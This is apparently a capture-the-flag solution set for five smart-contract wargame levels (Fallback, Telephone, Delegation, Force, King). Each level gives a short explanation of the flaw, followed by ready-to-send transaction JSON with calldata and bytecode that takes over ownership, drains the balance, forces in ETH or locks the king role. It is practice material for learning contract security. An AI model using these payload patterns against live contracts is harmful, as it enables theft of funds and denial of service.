## Fallback
Contribute 1 wei to give player a nonzero contribution, then send 1 wei via receive to set owner, then withdraw as owner to drain contract balance to zero. Validate sees player owner and zero balance.
```json
[
  {"to": "0xd3264fed42a0dc00663d0aa2b0abb90a19b347f2", "data": "0xf057478d", "value": "1"},
  {"to": "0xd3264fed42a0dc00663d0aa2b0abb90a19b347f2", "data": "0x", "value": "1"},
  {"to": "0xd3264fed42a0dc00663d0aa2b0abb90a19b347f2", "data": "0x3ccfd60b", "value": "0"}
]
```

## Telephone
Deploy a helper whose constructor calls Telephone.changeOwner(player); tx.origin is the player while msg.sender is the helper, satisfying the inequality and setting owner to player.
```json
[
  {"to": null, "data": "0x6024602a6000306000600060246000600073d3264fed42a0dc00663d0aa2b0abb90a19b347f25af15000a6f9dae10000000000000000000000002000000000000000000000000000000000000002", "value": "0"}
]
```

## Delegation
Send pwn() calldata to Delegation's fallback; it delegatecalls to Delegate, preserving the player as msg.sender and writing player into Delegation.owner.
```json
[
  {"to": "0x1780ddd8723ddc88d5def27cc1dfb16a73077434", "data": "0xdd01383d", "value": "0"}
]
```

## Force
Create a one-wei contract that immediately SELFDESTRUCTs to Force; selfdestruct transfers ETH without invoking receive, leaving Force balance positive.
```json
[
  {"to": null, "data": "0x73d3264fed42a0dc00663d0aa2b0abb90a19b347f2ff", "value": "1"}
]
```

## King
Deploy a contract funded with 0.001 ETH that pays King to become king, then returns reverting runtime. The factory's validation transfer to this king reverts, leaving king non-factory.
```json
[
  {"to": null, "data": "0x60006000600060003473d3264fed42a0dc00663d0aa2b0abb90a19b347f25af1506005602d60003060056000f360006000fd", "value": "1000000000000000"}
]
```